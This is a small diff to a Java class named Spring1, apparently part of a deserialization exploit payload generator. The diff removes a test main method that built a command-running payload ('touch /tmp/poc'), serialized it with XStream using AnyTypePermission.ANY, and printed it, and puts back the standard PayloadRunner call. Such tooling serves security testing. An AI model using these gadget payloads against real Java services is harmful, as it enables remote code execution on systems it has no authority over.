@@ -79,20 +79,7 @@ public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 	}
 
 	public static void main(final String[] args) throws Exception {
-
-		Spring1 c = new Spring1();
-		Object obj = c.getObject("touch /tmp/poc");
-		
-		XStream xStream = new XStream(new JettisonMappedXmlDriver());
-		xStream.setClassLoader(Thread.currentThread().getContextClassLoader());
-		xStream.addPermission(AnyTypePermission.ANY);
-
-
-
-		String xml = xStream.toXML(obj);                
-		System.out.println(xml);
-
-		// PayloadRunner.run(Spring1.class, args);
+		PayloadRunner.run(Spring1.class, args);
 	}
 
 	public static boolean isApplicableJavaVersion() {
